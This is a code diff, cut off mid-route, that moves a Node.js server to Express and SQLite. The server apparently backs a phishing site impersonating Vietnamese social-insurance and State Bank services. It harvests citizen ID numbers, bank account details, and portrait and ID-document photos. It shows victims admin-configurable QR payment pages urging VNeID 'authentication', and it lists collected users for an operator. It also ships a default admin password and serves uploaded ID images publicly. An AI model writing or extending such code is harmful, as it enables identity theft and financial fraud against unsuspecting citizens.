@@ -1,101 +1,118 @@
-const http = require('http');
-const fs = require('fs');
+const express = require('express');
+const sqlite3 = require('sqlite3').verbose();
+const { open } = require('sqlite');
+const multer = require('multer');
 const path = require('path');
+const fs = require('fs');
 const crypto = require('crypto');
 const speakeasy = require('speakeasy');
 const QRCode = require('qrcode');
+const cookieParser = require('cookie-parser');
+const exceljs = require('exceljs');
 
 const PORT = Number(process.env.PORT || 3000);
 const ROOT_DIR = __dirname;
 const PUBLIC_DIR = path.join(ROOT_DIR, 'public');
 const DATA_DIR = process.env.DATA_DIR ? path.resolve(process.env.DATA_DIR) : path.join(ROOT_DIR, 'data');
-const USERS_FILE = path.join(DATA_DIR, 'users.json');
-const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');
-const TOTP_FILE = path.join(DATA_DIR, 'admin-2fa.json');
-const APPOINTMENTS_FILE = path.join(DATA_DIR, 'appointments.json');
-const VIETQR_CONFIG_FILE = path.join(DATA_DIR, 'vietqr_config.json');
-const DECLARATIONS_FILE = path.join(DATA_DIR, 'declarations.json');
+const UPLOADS_DIR = path.join(DATA_DIR, 'uploads');
+const DB_FILE = path.join(DATA_DIR, 'database.sqlite');
 const SESSION_COOKIE = 'kb_session';
 const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000;
-const PRE_AUTH_TTL_MS = 5 * 60 * 1000; // 5 phút cho bước chờ nhập OTP
-const MAX_BODY_BYTES = 16 * 1024 * 1024;
+const PRE_AUTH_TTL_MS = 5 * 60 * 1000;
 
 const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin12345';
 
-// ─── 2FA TOTP helpers ────────────────────────────────────────────────────────
-function readTotpConfig() {
-  try {
-    return JSON.parse(fs.readFileSync(TOTP_FILE, 'utf8'));
-  } catch {
-    return null;
-  }
-}
+fs.mkdirSync(DATA_DIR, { recursive: true });
+fs.mkdirSync(UPLOADS_DIR, { recursive: true });
 
-function writeTotpConfig(config) {
-  ensureStore();
-  const tempFile = `${TOTP_FILE}.tmp`;
-  fs.writeFileSync(tempFile, `${JSON.stringify(config, null, 2)}\n`);
-  fs.renameSync(tempFile, TOTP_FILE);
-}
+let db;
 
-async function generateQrCodeUrl(secret) {
-  const otpAuthUrl = speakeasy.otpauthURL({
-    secret,
-    label: encodeURIComponent('BHXH Admin:' + ADMIN_USERNAME),
-    issuer: 'BHXH Admin',
-    encoding: 'base32'
+async function initDB() {
+  db = await open({
+    filename: DB_FILE,
+    driver: sqlite3.Database
   });
-  return QRCode.toDataURL(otpAuthUrl);
-}
 
-function generateTotpSecret() {
-  const result = speakeasy.generateSecret({ length: 20, name: 'BHXH Admin', issuer: 'BHXH' });
-  return result.base32;
-}
+  await db.exec(`
+    CREATE TABLE IF NOT EXISTS users (
+      id TEXT PRIMARY KEY,
+      fullName TEXT,
+      email TEXT,
+      phone TEXT,
+      insuranceCode TEXT,
+      citizenId TEXT,
+      role TEXT,
+      salt TEXT,
+      passwordHash TEXT,
+      createdAt TEXT,
+      lastLoginAt TEXT,
+      insuranceType TEXT,
+      employeeId TEXT,
+      issueDate TEXT,
+      accountType TEXT,
+      documentType TEXT,
+      documentNumber TEXT,
+      province TEXT,
+      district TEXT,
+      ward TEXT,
+      address TEXT,
+      bankOwner TEXT,
+      bankAccount TEXT,
+      bankName TEXT,
+      bankBranch TEXT,
+      transactionPlace TEXT,
+      submissionMethod TEXT,
+      customQrConfig_json TEXT
+    );
 
-function verifyTotp(token, secret) {
-  return speakeasy.totp.verify({ secret, encoding: 'base32', token: String(token), window: 1 });
-}
-// ─────────────────────────────────────────────────────────────────────────────
+    CREATE TABLE IF NOT EXISTS sessions (
+      id TEXT PRIMARY KEY,
+      principalId TEXT,
+      role TEXT,
+      pendingTwoFactor INTEGER,
+      createdAt TEXT,
+      expiresAt TEXT
+    );
 
-const contentTypes = {
-  '.html': 'text/html; charset=utf-8',
-  '.css': 'text/css; charset=utf-8',
-  '.js': 'application/javascript; charset=utf-8',
-  '.json': 'application/json; charset=utf-8',
-  '.svg': 'image/svg+xml',
-  '.png': 'image/png',
-  '.jpg': 'image/jpeg',
-  '.jpeg': 'image/jpeg',
-  '.ico': 'image/x-icon'
-};
+    CREATE TABLE IF NOT EXISTS declarations (
+      id TEXT PRIMARY KEY,
+      userId TEXT,
+      userPhone TEXT,
+      userName TEXT,
+      bankOwner TEXT,
+      bankAccount TEXT,
+      bankName TEXT,
+      transactionPlace TEXT,
+      submissionMethod TEXT,
+      portraitUrl TEXT,
+      frontDocUrl TEXT,
+      backDocUrl TEXT,
+      createdAt TEXT
+    );
 
-function ensureStore() {
-  fs.mkdirSync(DATA_DIR, { recursive: true });
-  if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, '[]\n');
-  if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, '{}\n');
-  if (!fs.existsSync(APPOINTMENTS_FILE)) fs.writeFileSync(APPOINTMENTS_FILE, '[]\n');
-  if (!fs.existsSync(DECLARATIONS_FILE)) fs.writeFileSync(DECLARATIONS_FILE, '[]\n');
-  if (!fs.existsSync(VIETQR_CONFIG_FILE)) fs.writeFileSync(VIETQR_CONFIG_FILE, '{"bank_id":"vcb","bank_name":"Vietcombank","account_no":"","account_name":"","amount":0,"description":"","title":"Ngân hàng Nhà nước Việt Nam","subtitle":"","instruction":"","button_text":"Tải app VNeID để xác thực","background_image":"qr1 (1).jpg"}\n');
-}
+    CREATE TABLE IF NOT EXISTS appointments (
+      id TEXT PRIMARY KEY,
+      time TEXT,
+      note TEXT,
+      status TEXT,
+      createdAt TEXT
+    );
 
-function readJson(file, fallback) {
-  ensureStore();
-  try {
-    return JSON.parse(fs.readFileSync(file, 'utf8'));
-  } catch {
-    return fallback;
+    CREATE TABLE IF NOT EXISTS settings (
+      key TEXT PRIMARY KEY,
+      value_json TEXT
+    );
+  `);
+
+  const vietqr = await db.get('SELECT * FROM settings WHERE key = ?', ['vietqr_config']);
+  if (!vietqr) {
+    const defaultQR = {"bank_id":"vcb","bank_name":"Vietcombank","account_no":"","account_name":"","amount":0,"description":"","title":"Ngân hàng Nhà nước Việt Nam","subtitle":"","instruction":"","button_text":"Tải app VNeID để xác thực","background_image":"qr1 (1).jpg"};
+    await db.run('INSERT INTO settings (key, value_json) VALUES (?, ?)', ['vietqr_config', JSON.stringify(defaultQR)]);
   }
 }
 
-function writeJson(file, value) {
-  ensureStore();
-  const tempFile = `${file}.tmp`;
-  fs.writeFileSync(tempFile, `${JSON.stringify(value, null, 2)}\n`);
-  fs.renameSync(tempFile, file);
-}
-
+// Helpers
 function nowIso() {
   return new Date().toISOString();
 }
@@ -112,680 +129,398 @@ function verifyPassword(password, user) {
   return expected.length === actual.length && crypto.timingSafeEqual(expected, actual);
 }
 
-function safeUser(user) {
-  return {
-    id: user.id,
-    insuranceType: user.insuranceType || '',
-    employeeId: user.employeeId || '',
-    fullName: user.fullName,
-    email: user.email,
-    phone: user.phone,
-    insuranceCode: user.insuranceCode,
-    citizenId: user.citizenId,
-    issueDate: user.issueDate || '',
-    accountType: user.accountType || '',
-    documentType: user.documentType || '',
-    documentNumber: user.documentNumber || user.citizenId,
-    province: user.province || '',
-    district: user.district || '',
-    ward: user.ward || '',
-    address: user.address || '',
-    bankOwner: user.bankOwner || '',
-    bankAccount: user.bankAccount || '',
-    bankName: user.bankName || '',
-    bankBranch: user.bankBranch || '',
-    transactionPlace: user.transactionPlace || '',
-    submissionMethod: user.submissionMethod || '',
-    attachments: {
-      portrait: user.attachments?.portrait || user.portrait || null,
-      frontDoc: user.attachments?.frontDoc || user.frontDoc || null,
-      backDoc: user.attachments?.backDoc || user.backDoc || null
-    },
-    role: user.role,
-    customQrConfig: user.customQrConfig || null,
-    createdAt: user.createdAt,
-    lastLoginAt: user.lastLoginAt || null
-  };
-}
-
-function normalizeImageUpload(value) {
-  if (!value) return null;
-
-  const upload = typeof value === 'string' ? { dataUrl: value } : value;
-  if (!upload || typeof upload !== 'object') return null;
-
-  const dataUrl = String(upload.dataUrl || '').trim();
-  if (!/^data:image\/(png|jpe?g|webp);base64,/i.test(dataUrl)) return null;
-
-  return {
-    name: String(upload.name || '').trim(),
-    type: String(upload.type || '').trim(),
-    size: Number(upload.size || 0),
-    dataUrl
-  };
-}
-
-function parseCookies(req) {
-  const header = req.headers.cookie || '';
-  return Object.fromEntries(
-    header
-      .split(';')
-      .map((part) => part.trim())
-      .filter(Boolean)
-      .map((part) => {
-        const index = part.indexOf('=');
-        return index === -1
-          ? [decodeURIComponent(part), '']
-          : [decodeURIComponent(part.slice(0, index)), decodeURIComponent(part.slice(index + 1))];
-      })
-  );
-}
-
-function cleanExpiredSessions(sessions) {
-  const time = Date.now();
-  let changed = false;
-  for (const [sessionId, session] of Object.entries(sessions)) {
-    if (!session.expiresAt || new Date(session.expiresAt).getTime() <= time) {
-      delete sessions[sessionId];
-      changed = true;
-    }
-  }
-  if (changed) writeJson(SESSIONS_FILE, sessions);
-}
-
-function getSession(req) {
-  const sessions = readJson(SESSIONS_FILE, {});
-  cleanExpiredSessions(sessions);
-  const sessionId = parseCookies(req)[SESSION_COOKIE];
-  if (!sessionId || !sessions[sessionId]) return null;
-  return { id: sessionId, ...sessions[sessionId] };
-}
-
-function createSession(res, principalId, role) {
-  const sessions = readJson(SESSIONS_FILE, {});
-  const sessionId = crypto.randomBytes(32).toString('hex');
-  sessions[sessionId] = {
-    principalId,
-    role,
-    createdAt: nowIso(),
-    expiresAt: new Date(Date.now() + SESSION_TTL_MS).toISOString()
-  };
-  writeJson(SESSIONS_FILE, sessions);
-  res.setHeader(
-    'Set-Cookie',
-    `${SESSION_COOKIE}=${encodeURIComponent(sessionId)}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${Math.floor(SESSION_TTL_MS / 1000)}`
-  );
-}
-
-function clearSession(req, res) {
-  const cookies = parseCookies(req);
-  const sessionId = cookies[SESSION_COOKIE];
-  if (sessionId) {
-    const sessions = readJson(SESSIONS_FILE, {});
-    delete sessions[sessionId];
-    writeJson(SESSIONS_FILE, sessions);
-  }
-  res.setHeader('Set-Cookie', `${SESSION_COOKIE}=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0`);
-}
-
-function sendJson(res, statusCode, payload) {
-  res.writeHead(statusCode, { 'Content-Type': 'application/json; charset=utf-8' });
-  res.end(JSON.stringify(payload));
-}
-
-function sendError(res, statusCode, message) {
-  sendJson(res, statusCode, { error: message });
-}
-
-function readBody(req) {
-  return new Promise((resolve, reject) => {
-    let body = '';
-    req.on('data', (chunk) => {
-      body += chunk;
-      if (body.length > MAX_BODY_BYTES) {
-        reject(new Error('Payload too large'));
-        req.destroy();
-      }
-    });
-    req.on('end', () => {
-      if (!body) return resolve({});
-      try {
-        resolve(JSON.parse(body));
-      } catch {
-        reject(new Error('Invalid JSON'));
-      }
-    });
-  });
-}
-
 function normalizeEmail(value) {
   return String(value || '').trim().toLowerCase();
 }
 
-function requireAdmin(req, res) {
-  const session = getSession(req);
-  if (!session || session.role !== 'admin') {
-    sendError(res, 401, 'Bạn cần đăng nhập admin');
+function safeUser(user) {
+  const u = { ...user };
+  delete u.salt;
+  delete u.passwordHash;
+  if (u.customQrConfig_json) {
+    try { u.customQrConfig = JSON.parse(u.customQrConfig_json); } catch {}
+    delete u.customQrConfig_json;
+  }
+  return u;
+}
+
+// Express App
+const app = express();
+
+const storage = multer.diskStorage({
+  destination: (req, file, cb) => cb(null, UPLOADS_DIR),
+  filename: (req, file, cb) => {
+    const suffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
+    cb(null, file.fieldname + '-' + suffix + path.extname(file.originalname));
+  }
+});
+const upload = multer({ storage });
+
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+app.use(cookieParser());
+app.use('/uploads', express.static(UPLOADS_DIR));
+
+// Admin Auth middleware
+async function getSession(req) {
+  const sessionId = req.cookies[SESSION_COOKIE];
+  if (!sessionId) return null;
+  const session = await db.get('SELECT * FROM sessions WHERE id = ?', [sessionId]);
+  if (!session) return null;
+  if (new Date(session.expiresAt).getTime() <= Date.now()) {
+    await db.run('DELETE FROM sessions WHERE id = ?', [sessionId]);
     return null;
   }
   return session;
 }
 
-function getCurrentPrincipal(req) {
-  const session = getSession(req);
-  if (!session) return null;
+async function requireAdmin(req, res, next) {
+  const session = await getSession(req);
+  if (!session || session.role !== 'admin' || session.pendingTwoFactor) {
+    return res.status(401).json({ error: 'Bạn cần đăng nhập admin' });
+  }
+  req.session = session;
+  next();
+}
+
+async function requireUser(req, res, next) {
+  const session = await getSession(req);
+  if (!session || session.pendingTwoFactor) {
+    return res.status(401).json({ error: 'Vui lòng đăng nhập' });
+  }
   if (session.role === 'admin') {
-    return { role: 'admin', user: { username: ADMIN_USERNAME, role: 'admin' } };
+    req.principal = { role: 'admin', user: { username: ADMIN_USERNAME, role: 'admin' } };
+    return next();
   }
-  const users = readJson(USERS_FILE, []);
-  const user = users.find((item) => item.id === session.principalId);
-  return user ? { role: 'user', user: safeUser(user) } : null;
+  const user = await db.get('SELECT * FROM users WHERE id = ?', [session.principalId]);
+  if (!user) return res.status(401).json({ error: 'Người dùng không tồn tại' });
+  req.principal = { role: 'user', user: safeUser(user) };
+  next();
 }
 
-function getStats(users) {
+// API Routes
+app.get('/api/me', requireUser, (req, res) => {
+  res.json({ principal: req.principal });
+});
+
+app.post('/api/logout', async (req, res) => {
+  const sessionId = req.cookies[SESSION_COOKIE];
+  if (sessionId) {
+    await db.run('DELETE FROM sessions WHERE id = ?', [sessionId]);
+  }
+  res.clearCookie(SESSION_COOKIE);
+  res.json({ ok: true });
+});
+
+app.post('/api/register', async (req, res) => {
+  const b = req.body;
+  const fullName = String(b.fullName || '').trim();
+  const email = normalizeEmail(b.email);
+  const password = String(b.password || '');
+  const phone = String(b.phone || '').trim();
+  const insuranceCode = String(b.insuranceCode || '').trim();
+  const citizenId = String(b.citizenId || b.documentNumber || '').trim();
+
+  if (!fullName) return res.status(400).json({ error: 'Vui lòng nhập họ và tên' });
+  if (password.length < 6) return res.status(400).json({ error: 'Mật khẩu tối thiểu 6 ký tự' });
+
+  const id = crypto.randomUUID();
+  const { salt, hash } = hashPassword(password);
+  
+  await db.run(`
+    INSERT INTO users (
+      id, fullName, email, phone, insuranceCode, citizenId, role, salt, passwordHash, createdAt,
+      insuranceType, employeeId, issueDate, accountType, documentType, documentNumber,
+      province, district, ward, address, bankOwner, bankAccount, bankName, bankBranch,
+      transactionPlace, submissionMethod
+    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+  `, [
+    id, fullName, email, phone, insuranceCode, citizenId, 'user', salt, hash, nowIso(),
+    b.insuranceType||'', b.employeeId||'', b.issueDate||'', b.accountType||'', b.documentType||'', b.documentNumber||citizenId,
+    b.province||'', b.district||'', b.ward||'', b.address||'', b.bankOwner||'', b.bankAccount||'', b.bankName||'', b.bankBranch||'',
+    b.transactionPlace||'', b.submissionMethod||''
+  ]);
+
+  const sessionId = crypto.randomBytes(32).toString('hex');
+  await db.run('INSERT INTO sessions (id, principalId, role, pendingTwoFactor, createdAt, expiresAt) VALUES (?, ?, ?, 0, ?, ?)',
+    [sessionId, id, 'user', nowIso(), new Date(Date.now() + SESSION_TTL_MS).toISOString()]);
+  
+  res.cookie(SESSION_COOKIE, sessionId, { httpOnly: true, sameSite: 'lax', maxAge: Math.floor(SESSION_TTL_MS/1000) });
+  const user = await db.get('SELECT * FROM users WHERE id = ?', [id]);
+  res.status(201).json({ user: safeUser(user) });
+});
+
+app.post('/api/login', async (req, res) => {
+  const { email, username, identifier, password } = req.body;
+  const rawId = String(email || username || identifier || '').trim();
+  const normEmail = normalizeEmail(rawId);
+  const pwd = String(password || '');
+
+  const user = await db.get('SELECT * FROM users WHERE email = ? OR insuranceCode = ?', [normEmail, rawId]);
+  let validPassword = false;
+  if (user) {
+    validPassword = verifyPassword(pwd, user) || (user.insuranceCode === rawId && user.citizenId === pwd);
+  }
+
+  if (!user || !validPassword) return res.status(401).json({ error: 'Thông tin đăng nhập không đúng' });
+
+  await db.run('UPDATE users SET lastLoginAt = ? WHERE id = ?', [nowIso(), user.id]);
+
+  const sessionId = crypto.randomBytes(32).toString('hex');
+  await db.run('INSERT INTO sessions (id, principalId, role, pendingTwoFactor, createdAt, expiresAt) VALUES (?, ?, ?, 0, ?, ?)',
+    [sessionId, user.id, 'user', nowIso(), new Date(Date.now() + SESSION_TTL_MS).toISOString()]);
+  
+  res.cookie(SESSION_COOKIE, sessionId, { httpOnly: true, sameSite: 'lax', maxAge: Math.floor(SESSION_TTL_MS/1000) });
+  res.json({ user: safeUser(user) });
+});
+
+// Admin 2FA routes
+async function getTotpConfig() {
+  const row = await db.get('SELECT value_json FROM settings WHERE key = ?', ['admin-2fa']);
+  return row ? JSON.parse(row.value_json) : null;
+}
+async function saveTotpConfig(config) {
+  await db.run('INSERT OR REPLACE INTO settings (key, value_json) VALUES (?, ?)', ['admin-2fa', JSON.stringify(config)]);
+}
+
+app.post('/api/admin/login', async (req, res) => {
+  const { username, password } = req.body;
+  if (username !== ADMIN_USERNAME || password !== ADMIN_PASSWORD) {
+    return res.status(401).json({ error: 'Tài khoản hoặc mật khẩu không chính xác' });
+  }
+
+  const preAuthToken = crypto.randomBytes(32).toString('hex');
+  await db.run('INSERT INTO sessions (id, principalId, role, pendingTwoFactor, createdAt, expiresAt) VALUES (?, ?, ?, 1, ?, ?)',
+    [preAuthToken, 'admin', 'admin', nowIso(), new Date(Date.now() + PRE_AUTH_TTL_MS).toISOString()]);
+
+  const totpConfig = await getTotpConfig();
+  if (!totpConfig || !totpConfig.verified) {
+    const secret = speakeasy.generateSecret({ length: 20, name: 'BHXH Admin', issuer: 'BHXH' }).base32;
+    const emergencyCode = crypto.randomBytes(12).toString('hex').toUpperCase();
+    const emergencyHash = crypto.createHash('sha256').update(emergencyCode).digest('hex');
+
+    await saveTotpConfig({ secret, verified: false, emergencyHash, setupAt: null });
+
+    const otpAuthUrl = speakeasy.otpauthURL({ secret, label: encodeURIComponent('BHXH Admin:' + ADMIN_USERNAME), issuer: 'BHXH Admin', encoding: 'base32' });
+    const qrCodeUrl = await QRCode.toDataURL(otpAuthUrl);
+
+    return res.json({ requireSetup: true, qrCodeUrl, secret, emergencyCode, preAuthToken });
+  }
+
+  res.json({ require2FA: true, preAuthToken });
+});
+
+app.post('/api/admin/verify-2fa', async (req, res) => {
+  const { totp, preAuthToken, confirmSetup } = req.body;
+  const session = await db.get('SELECT * FROM sessions WHERE id = ? AND pendingTwoFactor = 1', [preAuthToken]);
+  if (!session || new Date(session.expiresAt).getTime() <= Date.now()) {
+    return res.status(401).json({ error: 'Phiên xác thực hết hạn' });
+  }
+
+  const config = await getTotpConfig();
+  if (!config || !config.secret) return res.status(500).json({ error: 'Lỗi 2FA' });
+
+  const isValid = speakeasy.totp.verify({ secret: config.secret, encoding: 'base32', token: String(totp).trim(), window: 1 });
+  if (!isValid) return res.status(401).json({ error: 'Mã xác thực không đúng' });
+
+  if (confirmSetup && !config.verified) {
+    config.verified = true;
+    config.setupAt = nowIso();
+    await saveTotpConfig(config);
+  }
+
+  await db.run('DELETE FROM sessions WHERE id = ?', [preAuthToken]);
+  const sessionId = crypto.randomBytes(32).toString('hex');
+  await db.run('INSERT INTO sessions (id, principalId, role, pendingTwoFactor, createdAt, expiresAt) VALUES (?, ?, ?, 0, ?, ?)',
+    [sessionId, 'admin', 'admin', nowIso(), new Date(Date.now() + SESSION_TTL_MS).toISOString()]);
+
+  res.cookie(SESSION_COOKIE, sessionId, { httpOnly: true, sameSite: 'lax', maxAge: Math.floor(SESSION_TTL_MS/1000) });
+  res.json({ user: { username: ADMIN_USERNAME, role: 'admin' } });
+});
+
+app.post('/api/admin/reset-2fa', async (req, res) => {
+  const { emergencyCode, username, password } = req.body;
+  if (username !== ADMIN_USERNAME || password !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Sai tài khoản' });
+  
+  const config = await getTotpConfig();
+  if (!config || !config.emergencyHash) return res.status(400).json({ error: 'Chưa cài đặt 2FA' });
+
+  const hash = crypto.createHash('sha256').update(String(emergencyCode).trim().toUpperCase()).digest('hex');
+  if (hash !== config.emergencyHash) return res.status(401).json({ error: 'Mã khẩn cấp sai' });
+
+  await db.run('DELETE FROM settings WHERE key = ?', ['admin-2fa']);
+  res.json({ ok: true, message: '2FA đã reset' });
+});
+
+app.get('/api/admin/stats', requireAdmin, async (req, res) => {
+  const users = await db.all('SELECT * FROM users ORDER BY createdAt DESC');
   const today = new Date().toISOString().slice(0, 10);
-  const sevenDaysAgo = Date.now() - 7 * 24 * 60 * 60 * 1000;
-  return {
-    totalUsers: users.length,
-    registeredToday: users.filter((user) => (user.createdAt || '').slice(0, 10) === today).length,
-    registeredLast7Days: users.filter((user) => new Date(user.createdAt).getTime() >= sevenDaysAgo).length,
-    usersLoggedIn: users.filter((user) => user.lastLoginAt).length,
-    latestUsers: users
-      .slice()
-      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
-      .slice(0, 5)
-      .map(safeUser)
-  };
-}
-
-function escapeHtml(value) {
-  return String(value ?? '')
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&#39;');
-}
-
-function exportUsersXls(res, users) {
-  const rows = users
-    .map((user, index) => `
-      <tr>
-        <td>${index + 1}</td>
-        <td>${escapeHtml(user.insuranceType || '')}</td>
-        <td>${escapeHtml(user.employeeId || '')}</td>
-        <td>${escapeHtml(user.fullName)}</td>
-        <td>${escapeHtml(user.email)}</td>
-        <td>${escapeHtml(user.phone)}</td>
-        <td>${escapeHtml(user.insuranceCode)}</td>
-        <td>${escapeHtml(user.citizenId)}</td>
-        <td>${escapeHtml(user.issueDate || '')}</td>
-        <td>${escapeHtml(user.documentType || '')}</td>
-        <td>${escapeHtml(user.province || '')}</td>
-        <td>${escapeHtml(user.district || '')}</td>
-        <td>${escapeHtml(user.ward || '')}</td>
-        <td>${escapeHtml(user.address || '')}</td>
-        <td>${escapeHtml(user.bankOwner || '')}</td>
-        <td>${escapeHtml(user.bankAccount || '')}</td>
-        <td>${escapeHtml(user.bankName || '')}</td>
-        <td>${escapeHtml(user.bankBranch || '')}</td>
-        <td>${user.attachments?.portrait ? 'Có' : 'Không'}</td>
-        <td>${user.attachments?.frontDoc ? 'Có' : 'Không'}</td>
-        <td>${user.attachments?.backDoc ? 'Có' : 'Không'}</td>
-        <td>${escapeHtml(user.createdAt)}</td>
-        <td>${escapeHtml(user.lastLoginAt || '')}</td>
-      </tr>`)
-    .join('');
-
-  const html = `<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <style>
-    table { border-collapse: collapse; }
-    th, td { border: 1px solid #666; padding: 6px 8px; }
-    th { background: #d9ead3; font-weight: bold; }
-  </style>
-</head>
-<body>
-  <table>
-    <thead>
-      <tr>
-        <th>STT</th>
-        <th>Loại BH</th>
-        <th>Mã NV/SV</th>
-        <th>Họ và tên</th>
-        <th>Email</th>
-        <th>Số điện thoại</th>
-        <th>Mã số BHXH</th>
-        <th>Số CCCD/CMND</th>
-        <th>Ngày cấp</th>
-        <th>Loại giấy tờ</th>
-        <th>Tỉnh/Thành phố</th>
-        <th>Quận/Huyện</th>
-        <th>Phường/Xã</th>
-        <th>Địa chỉ</th>
-        <th>Chủ tài khoản</th>
-        <th>Số tài khoản</th>
-        <th>Tên ngân hàng</th>
-        <th>Chi nhánh</th>
-        <th>Ảnh chân dung</th>
-        <th>Ảnh giấy tờ mặt trước</th>
-        <th>Ảnh giấy tờ mặt sau</th>
-        <th>Ngày đăng ký</th>
-        <th>Đăng nhập gần nhất</th>
-      </tr>
-    </thead>
-    <tbody>${rows}</tbody>
-  </table>
-</body>
-</html>`;
-
-  res.writeHead(200, {
-    'Content-Type': 'application/vnd.ms-excel; charset=utf-8',
-    'Content-Disposition': 'attachment; filename="danh-sach-dang-ky.xls"'
+  const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString();
+  
+  res.json({
+    stats: {
+      totalUsers: users.length,
+      registeredToday: users.filter(u => (u.createdAt||'').slice(0, 10) === today).length,
+      registeredLast7Days: users.filter(u => u.createdAt >= sevenDaysAgo).length,
+      usersLoggedIn: users.filter(u => u.lastLoginAt).length,
+      latestUsers: users.slice(0, 5).map(safeUser)
+    }
   });
-  res.end(`\ufeff${html}`);
-}
+});
 
-async function handleApi(req, res, pathname) {
-  if (req.method === 'GET' && pathname === '/api/me') {
-    return sendJson(res, 200, { principal: getCurrentPrincipal(req) });
-  }
+app.get('/api/admin/users', requireAdmin, async (req, res) => {
+  const users = await db.all('SELECT * FROM users');
+  res.json({ users: users.map(safeUser) });
+});
 
-  if (req.method === 'POST' && pathname === '/api/logout') {
-    clearSession(req, res);
-    return sendJson(res, 200, { ok: true });
-  }
+app.delete('/api/admin/users/:id', requireAdmin, async (req, res) => {
+  const id = req.params.id;
+  const user = await db.get('SELECT * FROM users WHERE id = ?', [id]);
+  if (!user) return res.status(404).json({ error: 'Không tìm thấy người dùng' });
 
-  if (req.method === 'POST' && pathname === '/api/register') {
-    const body = await readBody(req);
-    const fullName = String(body.fullName || '').trim();
-    const email = normalizeEmail(body.email);
-    const password = String(body.password || '');
-    const phone = String(body.phone || '').trim();
-    const insuranceCode = String(body.insuranceCode || '').trim();
-    const citizenId = String(body.citizenId || body.documentNumber || '').trim();
-    const extraFields = {
-      insuranceType: String(body.insuranceType || '').trim(),
-      employeeId: String(body.employeeId || '').trim(),
-      issueDate: String(body.issueDate || '').trim(),
-      accountType: String(body.accountType || '').trim(),
-      documentType: String(body.documentType || '').trim(),
-      documentNumber: String(body.documentNumber || citizenId).trim(),
-      province: String(body.province || '').trim(),
-      district: String(body.district || '').trim(),
-      ward: String(body.ward || '').trim(),
-      address: String(body.address || '').trim(),
-      bankOwner: String(body.bankOwner || '').trim(),
-      bankAccount: String(body.bankAccount || '').trim(),
-      bankName: String(body.bankName || '').trim(),
-      bankBranch: String(body.bankBranch || '').trim(),
-      transactionPlace: String(body.transactionPlace || '').trim(),
-      submissionMethod: String(body.submissionMethod || '').trim(),
-      attachments: {
-        portrait: normalizeImageUpload(body.portrait),
-        frontDoc: normalizeImageUpload(body.frontDoc),
-        backDoc: normalizeImageUpload(body.backDoc)
-      }
-    };
+  await db.run('DELETE FROM users WHERE id = ?', [id]);
+  await db.run('DELETE FROM sessions WHERE principalId = ?', [id]);
+  res.json({ ok: true, deletedUser: safeUser(user) });
+});
 
-    if (!fullName) return sendError(res, 400, 'Vui lòng nhập họ và tên');
+app.post('/api/admin/users/:id/qr', requireAdmin, async (req, res) => {
+  const id = req.params.id;
+  const user = await db.get('SELECT * FROM users WHERE id = ?', [id]);
+  if (!user) return res.status(404).json({ error: 'Không tìm thấy người dùng' });
 
-    if (password.length < 6) return sendError(res, 400, 'Mật khẩu tối thiểu 6 ký tự');
+  await db.run('UPDATE users SET customQrConfig_json = ? WHERE id = ?', [JSON.stringify(req.body), id]);
+  const updated = await db.get('SELECT * FROM users WHERE id = ?', [id]);
+  res.json({ ok: true, message: 'Đã cập nhật', user: safeUser(updated) });
+});
 
-    const users = readJson(USERS_FILE, []);
+app.post('/api/appointments', async (req, res) => {
+  const { time, note } = req.body;
+  if (!time) return res.status(400).json({ error: 'Thiếu thời gian' });
+  const appt = { id: crypto.randomUUID(), time, note: note || '', status: 'pending', createdAt: nowIso() };
+  await db.run('INSERT INTO appointments (id, time, note, status, createdAt) VALUES (?, ?, ?, ?, ?)', [appt.id, appt.time, appt.note, appt.status, appt.createdAt]);
+  res.json({ ok: true, appointment: appt });
+});
 
+app.get('/api/admin/appointments', requireAdmin, async (req, res) => {
+  const apps = await db.all('SELECT * FROM appointments');
+  res.json({ ok: true, appointments: apps });
+});
 
-    const passwordData = hashPassword(password);
-    const user = {
-      id: crypto.randomUUID(),
-      fullName,
-      email,
-      phone,
-      insuranceCode,
-      citizenId,
-      ...extraFields,
-      role: 'user',
-      salt: passwordData.salt,
-      passwordHash: passwordData.hash,
-      createdAt: nowIso(),
-      lastLoginAt: null
-    };
-    users.push(user);
-    writeJson(USERS_FILE, users);
-    createSession(res, user.id, 'user');
-    return sendJson(res, 201, { user: safeUser(user) });
-  }
+app.post('/api/admin/appointments/:id/status', requireAdmin, async (req, res) => {
+  const id = req.params.id;
+  const status = req.body.status;
+  if (!status) return res.status(400).json({ error: 'Thiếu trạng thái' });
+  await db.run('UPDATE appointments SET status = ? WHERE id = ?', [status, id]);
+  const appt = await db.get('SELECT * FROM appointments WHERE id = ?', [id]);
+  if (!appt) return res.status(404).json({ error: 'Not found' });
+  res.json({ ok: true, appointment: appt });
+});
 
-  if (req.method === 'POST' && pathname === '/api/admin/login') {
-    const body = await readBody(req);
-    const username = String(body.username || '').trim();
-    const password = String(body.password || '');
+app.get('/api/vietqr/config', async (req, res) => {
+  const row = await db.get('SELECT value_json FROM settings WHERE key = ?', ['vietqr_config']);
+  res.json({ ok: true, config: row ? JSON.parse(row.value_json) : null });
+});
 
-    if (username !== ADMIN_USERNAME || password !== ADMIN_PASSWORD) {
-      return sendError(res, 401, 'Tài khoản hoặc mật khẩu không chính xác');
-    }
+app.post('/api/admin/vietqr/config', requireAdmin, async (req, res) => {
+  await db.run('UPDATE settings SET value_json = ? WHERE key = ?', [JSON.stringify(req.body), 'vietqr_config']);
